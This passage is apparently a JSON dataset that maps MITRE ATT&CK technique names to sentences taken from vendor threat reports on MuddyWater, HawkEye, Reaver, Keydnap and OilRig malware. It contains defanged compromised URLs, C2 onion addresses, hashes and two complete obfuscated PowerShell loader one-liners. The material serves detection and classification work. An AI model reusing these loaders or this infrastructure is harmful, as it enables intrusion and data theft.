hxxp://riyadhfoods[.]com/jquery-ui/js/jquery[.]aspx?c= hxxp://school[.]suliparwarda[.]com/components/com_akeeba/work[.]php?c= hxxp://school[.]suliparwarda[.]com/plugins/editors/codemirror/work[.]php?c= hxxp://suliparwarda[.]com/includes/panda[.]php?c= hxxp://suliparwarda[.]com/layouts/joomla/logs[.]php?c= hxxp://suliparwarda[.]com/wp-content/plugins/entry-views/work[.]php?c= hxxp://suliparwarda[.]com/wp-content/themes/twentyfifteen/work[.]php?c= hxxp://tmclub[.]eu/clubdata[.]php?c= hxxp://watyanagr[.]nfe[.]go[.]th/e-office/lib/work[.]php?c= hxxp://watyanagr[.]nfe[.]go[.]th/watyanagr/power[.]php?c= hxxp://whiver[.]in/power[.]php?c= hxxp://www[.]4seasonrentacar[.]com/viewsure/data[.]aspx?c= hxxp://www[.]akhtaredanesh[.]com/d/file/sym/work[.]php?c= hxxp://www[.]akhtaredanesh[.]com/d/oschool/power[.]php?c= hxxp://www[.]arcadecreative[.]com/work[.]php?c= hxxp://www[.]armaholic[.]com/list[.]php?c= hxxp://www[.]asan-max[.]com/files/articles/css[.]aspx?c= hxxp://www[.]asan-max[.]com/files/articles/large/css[.]aspx?c= hxxp://www[.]autotrans[.]hr/index[.]php?c= hxxp://www[.]dafc[.]co[.]uk/news[.]php?c= hxxp://www[.]eapa[.]org/asphalt[.]php?c= hxxp://www[.]elev8tor[.]com/show-work[.]php?c= hxxp://www[.]jdarchs[.]com/work[.]php?c= hxxp://www[.]kunkrooann[.]com/inc/work[.]php?c= hxxp://www[.]mackellarscreenworks[.]com/work[.]php?c= hxxp://www[.]mitegen[.]com/mic_catalog[.]php?c= hxxp://www[.]nigelwhitfield[.]com/v2/work[.]php?c= hxxp://www[.]pomegranates[.]org/index[.]php?c= hxxp://www[.]ridefox[.]com/content[.]php?c= hxxp://www[.]shapingtomorrowsworld[.]org/category[.]php?c= hxxp://www[.]vanessajackson[.]co[.]uk/work[.]php?c= hxxp://www[.]yaran[.]co//wp-content/plugins/so-masonry/logs[.]php?c= hxxp://www[.]yaran[.]co/wp-includes/widgets/logs[.]php?c= hxxp://www[.]ztm[.]waw[.]pl/pop[.]php?c= hxxps://coa[.]inducks[.]org/publication[.]php?c= hxxps://mhtevents[.]com/account[.]php?c= hxxps://skepticalscience[.]com/graphics[.]php?c= hxxps://wallpapercase[.]com/wp-content/themes/twentyfifteen/logs[.]php?c= hxxps://wallpapercase[.]com/wp-includes/customize/logs[.]php?c= hxxps://www[.]spearhead-training[.]com//html/power[.]php?c= hxxps://www[.]spearhead-training[.]com/work[.]php?c= \u00a0 The post Muddying the Water: Targeted Attacks in the Middle East appeared first on Palo Alto Networks Blog"
    ]
  },
  "file deletion file and directory discovery-multi": {
    "technique_names": [
      "indicator removal on host: file deletion",
      "file and directory discovery"
    ],
    "sentances": [
      "Regardless of the file extensions, the files dropped by the macro are EITHER INF, SCT and text files OR VBS and text files"
    ]
  },
  "deobfuscate/decode files or information masquerading powershell-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "masquerading",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "powershell.exe -exec Bypass -c $s=(get-content C:\\\\ProgramData\\\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(\u201d,$d));  PowerShell one-liner Encoded text file Execution flow:  Case 2: VBS and text files dropped by the macro The VBS file decodes itself and calls mshta.exe, passing on one line of VBScript code to it, which in turn spawns a PowerShell one-liner which finally consumes the text file (usually Base64-encoded text)"
    ]
  },
  "masquerading powershell-multi": {
    "technique_names": [
      "masquerading",
      "event triggered execution: powershell profile"
    ],
    "sentances": [
      "powershell.exe -w 1 -exec Bypass -nologo -noprofile -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\ZIPSDK\\ProjectConfManagerNT.ini))));  PowerShell one-liner Encoded text file Execution flow:  The PowerShell code When PowerShell is invoked whether via WMI, wscript.exe, or mshta.exe, it executes a one-liner PowerShell code (as outlined above) that reads the encoded text file dropped in ProgramData and then decodes it"
    ]
  },
  "system owner/user discovery data from local system account discovery user execution-multi": {
    "technique_names": [
      "system owner/user discovery",
      "data from local system",
      "account discovery",
      "user execution"
    ],
    "sentances": [
      "The paths discovered are:  \u2022 C:\\Users\\leo\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd \u2022 C:\\Users\\poopak\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd \u2022 C:\\Users\\Vendetta\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd \u2022 C:\\Users\\Turk\\AppData\\Local\\Temp\\Word8.0\\MSForms.exd   Leo, Poopak, Vendetta and Turk are the usernames of those creating the documents or the templates on which they are based"
    ]
  },
  "code signing standard application layer protocol scheduled task deobfuscate/decode files or information file and directory discovery exploitation for client execution hidden files and directories-multi": {
    "technique_names": [
      "subvert trust controls: code signing",
      "application layer protocol",
      "scheduled task/job",
      "deobfuscate/decode files or information",
      "file and directory discovery",
      "exploitation for client execution",
      "hide artifacts: hidden files and directories"
    ],
    "sentances": [
      "Contact: intelreports@kaspersky.com Indicators of compromise MD5 08acd1149b09bf6455c553f512b51085 a9ec30226c83ba6d7abb8d2011cdae14 E5683fb480353c0dec333a7573710748 159238b473f80272fdcd0a8ddf336a91 16ac1a2c1e1c3b49e1a3a48fb71cc74f 1b086ab28e3d6f73c6605f9ae087ad4a 23c82e8c028af5c64cbe37314732ec19 24e1bd221ba3813ed7b6056136237587 2e82e242cb0684b98a8f6f2c0e8a12f3 37f7e6e5f073508e1ee552ebea5d200e 3bb14adb551663fd2328d59f653ba757 3c2a0d6d0ecf06f1be9ad411d06f7ba8 4c5a5c236c9f4480b3d725f297673fad 4f873578956d2790101443f24e4bd4d3 5466c8a099d1d30096775b1f4357d3cf 59502e209aedf80e170e653306ca1553 5a42a712e3b3cfa1db32d9e3d832f8f1 5bd61a94e7698574eaf82ef277316463 5de97ae178888f2dd222bb8a66060ac2 665947cf7037a6772687b69279753cdf 7a2ff07283ddc69d9f34cfa0d3c936d4 7beb94f602e97785370fec2d059d54a5 801f34abbf90ac2b4fb4b6289830cd16 864d6321be50f29e7a7a4bfab746245a 8a36d91ca331f62642dbcafc2ea1b1ab 9486593e4fb5a4d440093d54a3519187 94edf251b5fe7cc19488b5f0c3c3e359 9c6648cedeb3f5d9f6d104e638bd0c3d 9f4044674100a8c28f9ed1b336c337ce aa1e8d0e1c4d4eb9984124df003ea7f2 aa564e207926d06b8a59ba50ca2c543d ab4f947f4649b9ec28d182b02778aa69 ad92ccf85ec170f340457d33bbb81df5 b8939fa58fad8aa1ec271f6dae0b7255 bb476622bcb0c666e12fbe4ccda8bbef be62fc5b1576e0a8491519e10bab931d bf310319d6ef95f69a45fc4f2d237ed4 c375bbf248592cee1a1999227457c300 c73fc71ee35e99230941f03fc32934d9 c8b0458c384fd34971875b1c753c9c7c cd371d1d3bd7c8e2110587cfa8b7eaea ce2df2907ce543438c19cfaf6c14f699 d15aee026074fbd18f780fb51ec0632a d632c8444aab1b43a663401e80c0bac4 d6acee43d61cbd4bcd7a5bdf4ed9b343 e3e25957b738968befcf2333aa637d97 e5683fb480353c0dec333a7573710748 eb69fb45feb97af81c2f306564acc2da f00fd318bf58586c29ab970132d1fd2a f2b5373f32a4b9b3d34701ff973ba69c f84914c30ae4e6b9b1f23d5c01e001ed faa4469d5cd90623312c86d651f2d930 Ffb8ea0347a3af3dd2ab1b4e5a1be18a 345b1ea293764df86506f97ba498cc5e 029cb7e622f4eb0d058d577c9d322e92 06178b5181f30ce00cd55e2690f667ac 2b8ab9112e34bb910055d85ec800db3f 47ec75d3290add179ac5218d193bb9a8 befc203d7fa4c91326791a73e6d6b4da C561e81e30316208925bfddb3cf3360a 132efd7b3bdfb591c1bf2a4e19c710eb e7a6c57566d9523daa57fe16f52e377e c0e35c4523a7931f4c99616d6079fd14 245fa82c89875b70c2669921d4ba14d3 File names %SystemDrive%\\ProgramData\\EventManager.dll %SystemDrive%\\ProgramData\\EventManager.logs %SystemDrive%\\ProgramData\\WindowsDefenderService.ini %SystemDrive%\\ProgramData\\Defender.sct %SystemDrive%\\ProgramData\\DefenderService.inf %SystemDrive%\\ProgramData\\WindowsDefender.ini %SystemDrive%\\ProgramData\\ZIPSDK\\InstallConfNT.vbs %SystemDrive%\\ProgramData\\ZIPSDK\\ProjectConfManagerNT.ini %SystemDrive%\\ProgramData\\WindowsDefenderTask.ini %SystemDrive%\\ProgramData\\WindowsDefenderTask.txt %SystemDrive%\\ProgramData\\WindowsDefenderTask.xml %SystemDrive%\\ProgramData\\DefenderNT\\ConfigRegister.vbs %SystemDrive%\\ProgramData\\DefenderNT\\SetupConf.ini %SystemDrive%\\ProgramData\\ASDKiMalwareSDK\\ProjectConfSDK.vbs %SystemDrive%\\ProgramData\\ASDKiMalwareSDK\\SetupConfSDK.ini %SystemDrive%\\ProgramData\\FirefoxSDK\\ConfigRegisterSDK.ini %SystemDrive%\\ProgramData\\FirefoxSDK\\ConfigRegisterSDK.vbs %SystemDrive%\\ProgramData\\OneDrive.dll %SystemDrive%\\ProgramData\\OneDrive.html %SystemDrive%\\ProgramData\\OneDrive.ini %SystemDrive%\\ProgramData\\WindowsNT\\WindowsNT.ini %SystemDrive%\\ProgramData\\WindowsNT\\WindowsNT.vbs %SystemDrive%\\ProgramData\\SYSTEM32SDK\\ConfManagerNT.vbs %SystemDrive%\\ProgramData\\SYSTEM32SDK\\ProjectConfManagerNT.ini %windir%\\System32\\Tasks\\Microsoft\\WindowsDefenderUpdater %windir%\\System32\\Tasks\\Microsoft\\MicrosoftOneDrive %windir%\\System32\\Tasks\\Microsoft\\WindowsDifenderUpdate %windir%\\System32\\Tasks\\Microsoft\\WindowsSystem32SDK %windir%\\System32\\Tasks\\Microsoft\\WindowsDefenderSDK %windir%\\System32\\Tasks\\Microsoft\\WindowsMalwareDefenderSDK %windir%\\System32\\Tasks\\Microsoft\\WindowsMalwareByteSDK Domains, URLs and IP addresses http://www.cankayasrc[.]com/style/js/main.php http://ektamservis[.]com/includes/main.php http://gtme[.]ae/font-awesome/css/main.php https://www.adfg[.]ae/wp-includes/widgets/main.php http://adibf[.]ae/wp-includes/js/main.php http://hubinasia[.]com/wp-includes/widgets/main.php https://benangin[.]com/wp-includes/widgets/main.php 104.237.233.60 104.237.255.212 104.237.233.40 5.9.0.155"
    ]
  },
  "data staged shortcut modification-multi": {
    "technique_names": [
      "data staged",
      "boot or logon autostart execution: shortcut modification"
    ],
    "sentances": [
      "Upon execution, the \u201cWindows Folder.exe\u201d file copies itself to C:\\Users\\<username>\\AppData\\Roaming and creates a Windows shortcut (LNK) file in the victim\u2019s Startup directory as a persistence mechanism"
    ]
  },
  "process hollowing process injection-multi": {
    "technique_names": [
      "process injection: process hollowing",
      "process injection"
    ],
    "sentances": [
      "(Source: SecureWorks)  The \u201cWindows Folder.exe\u201d executable spawns and injects code into the legitimate notepad.exe Windows process (see Figure 2)",
      "The function will take another executable embedded in the initial Trojan as a resource named \u201cM\u201d, which it attempts to inject into the following process to execute: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe While it\u2019s configured to inject into cvtres.exe, the Trojan is also capable of injecting its code into the following process as well: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \u00a0 Embedded injector Trojan The R payload discussed above is nothing more than an injector Trojan, which accepts a path to an executable and a buffer of code to inject into the process as arguments"
    ]
  },
  "system owner/user discovery input capture-multi": {
    "technique_names": ["system owner/user discovery", "input capture"],
    "sentances": [
      "(Source: SecureWorks)  NetWire logs keystrokes and peripheral inputs into encoded files in the C:\\Users\\<username>   Figure 3"
    ]
  },
  "new service fallback channels-multi": {
    "technique_names": ["create or modify system process", "fallback channels"],
    "sentances": [
      "In December 2018, a thread on HackForums described a change in the ownership and ongoing development of the HawkEye keylogger.Shortly following this exchange, new posts began to appear that were attempting to market and sell new versions of HawkEye (HawkEye Reborn v9), with these new posts also referencing the change in ownership of the project moving forward.HawkEye Reborn v9 is currently marketed as an \"Advance Monitoring Solution.\" It is currently being sold using a licensing model, with purchasers gaining access to the software and updates for different periods based on a tiered pricing model.HawkEye Reborn v9 also features a Terms of Service agreement that provides some additional insight"
    ]
  },
  "spearphishing attachment file and directory discovery-multi": {
    "technique_names": [
      "phishing: spearphishing attachment",
      "file and directory discovery"
    ],
    "sentances": [
      "An example of one of these emails is below:Figure 1: Example email messageWhile the current email contains leverage malicious Microsoft Excel files, earlier campaigns have also been observed leveraging RTF and DOC files"
    ]
  },
  "process discovery input capture-multi": {
    "technique_names": ["process discovery", "input capture"],
    "sentances": [
      "Assuming the victim opens the attachment, the infection process begins as described in the following section.Many of the distribution servers that are being used to host the HawkEye keylogger binaries that are retrieved during the infection process are hosting large numbers of malicious binaries and, in many cases, contain open directory listings that can be used to identify the scope of the infections that they are being used to facilitate"
    ]
  },
  "disabling security tools deobfuscate/decode files or information-multi": {
    "technique_names": [
      "impair defenses: disable or modify tools",
      "deobfuscate/decode files or information"
    ],
    "sentances": [
      "When HawkEye is executed, in line 34, byte[] byte_ = gclass.method_0()[\"0\", GClass30.GEnum3.RCDATA].Byte_0;it reads the encrypted configuration from the RCDATA resource and in line 33,byte[] byte_2 = GClass29.smethod_12(byte_, GClass12.string_0);and then decrypts this data with the Rijndael algorithm you can see below in the RijndaelManaged function to initialize the HawkEye configuration settings.The decrypted configuration shows us the account used for exfiltration:The main loop of HawkEye has the following functions:This shows the rich feature set of HawkEye"
    ]
  },
  "screen capture credential dumping system information discovery video capture-multi": {
    "technique_names": [
      "screen capture",
      "os credential dumping",
      "system information discovery",
      "video capture"
    ],
    "sentances": [
      "The adversaries can get detailed information about the victim's machine, as you can see in the screenshot below.Beside the system information, it steals passwords from common web browsers, Filezilla, Beyluxe Messenger, CoreFTP and the video game \"Minecraft.\" It also starts a keylogger, steals clipboard content, takes screenshots from the desktop and pictures from the webcam"
    ]
  },
  "disabling security tools standard application layer protocol-multi": {
    "technique_names": [
      "impair defenses: disable or modify tools",
      "application layer protocol"
    ],
    "sentances": [
      "HawkEye offers the following exfiltration options based on the configuration: email, FTP, SFTP, HTTP POST to PanelURL API or ProxyURL.As mentioned above, in the comments of the main loop section, it also comes with several anti-analysis features, including starting an anti-debugging thread or disabling certain AV-related programs via the Image File Execution Options (IFEO) evasion technique by registering invalid debuggers that redirect and effectively disable various system and security applications.The following diagram summarizes the full infection process:ConclusionRecent changes in both the ownership and development efforts of the HawkEye Reborn keylogger/stealer demonstrate that this is a threat that will continue to experience ongoing development and improvement moving forward"
    ]
  },
  "spearphishing link security software discovery disabling security tools spearphishing attachment user execution dll side-loading-multi": {
    "technique_names": [
      "phishing: spearphishing link",
      "software discovery: security software discovery",
      "impair defenses: disable or modify tools",
      "phishing: spearphishing attachment",
      "user execution",
      "hijack execution flow: dll side-loading"
    ],
    "sentances": [
      "Talos continues to monitor this threat as it changes to ensure that customers remain protected from this and other threats as they continue to emerge and evolve.CoverageAdditional ways our customers can detect and block this threat are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.Cisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security\u00a0can block malicious emails sent by threat actors as part of their campaign.Network Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX\u00a0can detect malicious activity associated with this threat.AMP Threat Grid\u00a0helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on\u00a0Snort.org.Indicators of compromiseThe following IOCs are associated with various malware distribution campaigns that were observed during the analysis of Hawkeye Reborn v9 activity.Attachment hashes (SHA256)A list of hashes observed to be associated with malicious email attachments can be found here.PE32 hashes (SHA256)A list of hashes observed to be associated with malicious PE32 executables can be found here.DomainsThe following domains have been observed to be associated with malware campaigns"
    ]
  },
  "timestomp hidden files and directories system time discovery-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "hide artifacts: hidden files and directories",
      "system time discovery"
    ],
    "sentances": [
      "The dropper installs the backdoor, sets its attributes to \u201chidden\u201d, and sets a random file date and time When the dropper installs the backdoor, it sets its attributes to \u201chidden\u201d and sets file date and time to\u00a0 random values using the touch command: touch \u2013t YYMMDDMM \u201c/path/filename\u201d > /dev/null"
    ]
  },
  "hidden files and directories launch agent-multi": {
    "technique_names": [
      "hide artifacts: hidden files and directories",
      "create or modify system process: launch agent"
    ],
    "sentances": [
      "Afterwards, the persistence file will be created in /Library/LaunchDaemons/ or ~/Library/LaunchAgents/ \u00a0folder"
    ]
  },
  "custom cryptographic protocol data encrypted-multi": {
    "technique_names": ["encrypted channel", "data encrypted for impact"],
    "sentances": [
      "Encoding the encryption key  In order for the C&C server to decrypt the encrypted data, the randomly generated AES256 key must be included in the packet along with the encrypted data"
    ]
  },
  "screen capture proxy-multi": {
    "technique_names": ["screen capture"],
    "sentances": [
      "Function for scrambling AES256 key in the outgoing packet  Some screenshots taken during scrambling and encryption process:   Figure 21.\u00a0The highlighted bytes represent the scrambled computer info   Figure 22.\u00a0Randomly generated AES256 key   Figure 23.\u00a0Scrambled AES256 key (0xC1 XOR 0x13 = 0xD2, 0xD2 ROL 6 = 0xB4) etc.)   Figure 24.\u00a0Computer info encrypted with AES256 key   Figure 25.\u00a0Screenshot of the final payload to be sent to C&C server"
    ]
  },
  "deobfuscate/decode files or information fallback channels-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "fallback channels"
    ],
    "sentances": [
      "Figure 26.\u00a0Communication with the C&C server after the exchange of OS packet info Meanwhile, the runHandle method of the main backdoor loop will call for the requestServer method with the following backdoor commands (each command has one byte long code and is extracted by Packet::getCommand):   Figure 27.\u00a0The getCommand method The figure below shows the example of two of several possible command codes"
    ]
  },
  "standard application layer protocol system network connections discovery-multi": {
    "technique_names": [
      "application layer protocol",
      "system network connections discovery"
    ],
    "sentances": [
      "Reaver.v1 has been observed delivering a payload that uses HTTP for network communication, while versions 2 and 3 use a payload that uses raw TCP connections for this communication"
    ]
  },
  "deobfuscate/decode files or information data staged-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "data staged"
    ],
    "sentances": [
      "This decrypted data is written to the following location:  %TEMP%\\WUpdate.~tmp  This \u2018WUpdate.~tmp\u2019 file is then copied to a filename of \u2018Applet.cpl\u2019, which is placed in the previously identified file path"
    ]
  },
  "registry run keys / startup folder query registry-multi": {
    "technique_names": [
      "boot or logon autostart execution: registry run keys / startup folder",
      "query registry"
    ],
    "sentances": [
      "In the event this privilege was obtained, the common startup folder is queried by reading the following registry key:  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Common Startup  Alternatively, if the privilege was unable to be obtained, Reaver.v2 will obtain the user\u2019s startup folder by querying the following registry key:  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Startup  Reaver proceeds to write a shortcut file to \u2018%TEMP%\\~WUpdate.lnk\u2019"
    ]
  },
  "timestomp masquerading data staged-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "masquerading",
      "data staged"
    ],
    "sentances": [
      "This file is written to the following file path:  % TEMP%\\Update.~tmp  After the file is written, it is then copied to a filename of \u2019winhelp.cpl\u2019 in the directory that was initially chosen"
    ]
  },
  "data from local system file deletion file and directory discovery-multi": {
    "technique_names": [
      "data from local system",
      "indicator removal on host: file deletion",
      "file and directory discovery"
    ],
    "sentances": [
      "We have observed the following capabilities of this payload:  Get drive information Read files Write files Delete files Move files Spawn processes Create directories   Reaver TCP Payload The malicious CPL payload of Reaver has the following three exported functions:  ServiceMain CPlApplet DllEntryPoint  When the malware is initially loaded, DllEntryPoint will be called, which in turn will call a function that is responsible for decompressing a blob of data"
    ]
  },
  "system services: service execution": [
    "An example of this decompressed configuration may be seen below:  Figure 2 Decompressed Reaver configuration This configuration contains multiple pieces of information, including the following:  Network port Sleep timer between network requests Remote Command and Control (C2) Service Name Service Description Service Display Name Hardcoded String",
    "Much like the original payload, this tool uses if/else statements to skip the legitimate code in the Saransh Email System source to run the malicious functions, which have the same method names as the original tool and follow the same call sequence:  Form1.Speed Form1.diomadnfagaghagh Form1.fjcsERIfjfiojsGHIsdifjksi Form1.gsgjIDJIGJIGJIGJIFDOSpl Form1.FJaioefgkaoeK  This chain of functions eventually loads a resource named \u2018GSrdofjksrgj\u2019, which the tool decrypts using the same algorithm and key as in the initial payload:byte[] array4 = new byte[] {     19,     129,     43,     37,     56,     65,     255,     75,     111,     19,     211,     120,     0,     49,     126,     248 };The decrypted payload has a SHA256 hash of 5e805a88294f6d25d55103d19d13e798e01ad70e6b89e9c58db5d468cc63b3d5, which is a variant of the NanoCore remote administration tool",
    "The files we recovered indicate they do it by executing a script file, which uses the Sysinternals  psexec tool to move laterally by trying to copy it to every machine they can reach:",
    "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).\n\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation."
  ],
  "modify registry": [
    "The following capabilities have been observed in this payload:  Get drive information Modify files Modify directories Modify registry Spawn process Terminate process Modify services Kill self   Ties to SunOrcal Reaver was used concurrently with SunOrcal over the past year, to include two Reaver samples dropped from zip files hosted on a domain also being used as a SunOrcal C2 (www.fyoutside[.]com), and there is also passive DNS overlap amongst the C2s",
    "",
    "The backdoor will modify the registry for the Windows Media Player to store its C&C configuration.",
    "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication."
  ],
  "standard application layer protocol execution through api-multi": {
    "technique_names": ["application layer protocol", "native api"],
    "sentances": [
      "We\u2019ve seen two onion addresses used in different samples:  g5wcesdfjzne7255.onion (Down) r2elajikcosf7zee.onion (Alive at time of writing)  The HTTP resource always starts with /api/osx/ and contains actions such as:  /api/osx/started to report the bot has just started /api/osx/keychain to exfiltrate the content of the keychain /api/osx/get_task?bot_id={botid}&version={version} to request a task (described below) /api/osx/cmd_executed to report a the output of a command that was executed /api/osx/task_complete?bot_id={botid}&task_id={taskid} to report a task was completed  HTTP POST content has two fields: bot_id and data"
    ]
  },
  "deobfuscate/decode files or information data encoding service execution-multi": {
    "technique_names": [
      "deobfuscate/decode files or information",
      "data encoding",
      "system services: service execution"
    ],
    "sentances": [
      "Command IDDescription     0Uninstall Keydnap and quit   1Update the backdoor from a base64-encoded file   2Update the backdoor given a URL   3Decode and execute a base64-encoded file   4Decode and execute a base64-encoded Python script   5Download and execute a file from a URL   6Download and execute a Python script from a URL   7Execute a command and report the output back to the C&C server   8Request administrator privileges the next time the user runs an application   9Decode and execute, or stop, a base64-encoded file calledauthd_service    The last two commands stand out"
    ]
  },
  "screen capture exploitation for privilege escalation windows admin shares-multi": {
    "technique_names": [
      "screen capture",
      "exploitation for privilege escalation",
      "remote services: smb/windows admin shares"
    ],
    "sentances": [
      "SHA-1FilenameFirst seen on VirusTotalBackdoor download URLDecoy description or URL     07cd177f5baf8c1bdbbae22f1e8f03f22dfdb148\"info_list.txt \"2016-05-09hxxp://dev.aneros.com/media/icloudsyncd\"Most Common Interview Questions\"   78ba1152ef3883e63f10c3a85cbf00f2bb305a6a\"screenshot_2016-06-28-01.jpg \"2016-06-28hxxp://freesafesoft.com/icloudsyncdBlackHat-TDS Panel screenshot   773a82343367b3d09965f6f09cc9887e7f8f01bf\"screenshot.jpg \"2016-05-07hxxp://dev.aneros.com/media/icloudsyncdFirefox 20 about screenshot   dfdb38f1e3ca88cfc8e9a2828599a8ce94eb958c\"CVdetails.doc \"2016-05-03hxxp://lovefromscratch.ca/wp-admin/css/icloudsyncdhxxp://lovefromscratch.ca/wp-admin/CVdetails.doc   2739170ed195ff1b9f00c44502a21b5613d08a58\"CVdetails.doc \"2016-05-03hxxp://lovefromscratch.ca/wp-admin/css/icloudsyncdhxxp://lovefromscratch.ca/wp-admin/CVdetails.doc   e9d4523d9116b3190f2068b1be10229e96f21729\"logo.jpg \"2016-06-02hxxp://dev.aneros.com/media/icloudsyncdsanelite logo   7472102922f91a78268430510eced1059eef1770\"screenshot_9324 2.jpg \"2016-06-28hxxp://freesafesoft.com/icloudsyncdSome C&C panel    Backdoor    SHA-1ESET Detection nameC&CVersion     a4bc56f5ddbe006c9a68422a7132ad782c1aeb7bOSX/Keydnap.Ahxxps://g5wcesdfjzne7255.onion.to1.3.1   abf99129e0682d2fa40c30a1a1ad9e0c701e14a4OSX/Keydnap.Ahxxps://r2elajikcosf7zee.onion.to1.3.5    Backdoor C&C servers  hxxps://g5wcesdfjzne7255.onion.to/ hxxps://r2elajikcosf7zee.onion.to/  Keydnap\u2019s IoCs are also available and updated on ESET\u2019s malware-ioc Github repository"
    ]
  },
  "masquerading data staged scripting-multi": {
    "technique_names": [
      "masquerading",
      "data staged",
      "command and scripting interpreter"
    ],
    "sentances": [
      "The v.vbs script drops four components (hUpdateCheckers.base, dUpdateCheckers.base, cUpdateCheckers.bat, and GoogleUpdateschecker.vbs) to the directory: C:\\ProgramData\\Windows\\Microsoft\\java\\ v.vbs uses CertUtil.exe, a legitimate Microsoft command-line program installed as part of Certificate Services, to decode the base64-encoded files hUpdateCheckers.base and dUpdateCheckers.base, and drop hUpdateCheckers.ps1 and dUpdateCheckers.ps1 to the staging directory"
    ]
  },
  "scheduled task execution through api scripting-multi": {
    "technique_names": [
      "scheduled task/job",
      "native api",
      "command and scripting interpreter"
    ],
    "sentances": [
      "Figure 4: Execution Workflow Section of v.vbs After successful execution of the steps mentioned in the Execution Workflow section, the Task Scheduler will launch GoogleUpdateschecker.vbs every minute, which in turn executes the dUpdateCheckers.ps1 and hUpdateCheckers.ps1 scripts"
    ]
  },
  "timestomp exfiltration over command and control channel remote file copy-multi": {
    "technique_names": [
      "indicator removal on host: timestomp",
      "exfiltration over c2 channel",
      "ingress tool transfer"
    ],
    "sentances": [
      "Command  Description  Action  0  Server response string contains batch commands  Execute batch commands and send results back to server  1  Server response string is a file path  Check for file path and upload (PUT) the file to server  2  Server response string is a file path  Check for file path and download (GET) the file   Table 1: POWRUNER commands After successfully executing the command, POWRUNER sends the results back to the C2 server and stops execution"
    ]
  },
  "masquerading system network configuration discovery-multi": {
    "technique_names": [
      "masquerading",
      "system network configuration discovery"
    ],
    "sentances": [
      "Hardcoded domain \u201cmumbai-m[.]site\u201d  BONDUPDATER will attempt to resolve the resulting DGA domain and will take the following actions based on the IP address resolution:  Create a temporary file in %temp% location The file created will have the last two octets of the resolved IP addresses as its filename",
      "Malware samples and infrastructure for hxxp://stemtopx[.]com    Pattern Example   [domain]/work/docnew/[filename]   [domain]/administrator/help/[filename]   [domain]/xe/m/[filename]   [domain]/xe/s/[filename]   [domain]/images/yupsia/exe/[filename]   [domain]/images/yupsia/doc/[filename]    Table 2"
    ]
  },
  "standard application layer protocol masquerading web service exploitation for client execution-multi": {
    "technique_names": [
      "application layer protocol",
      "masquerading",
      "web service",
      "exploitation for client execution"
    ],
    "sentances": [
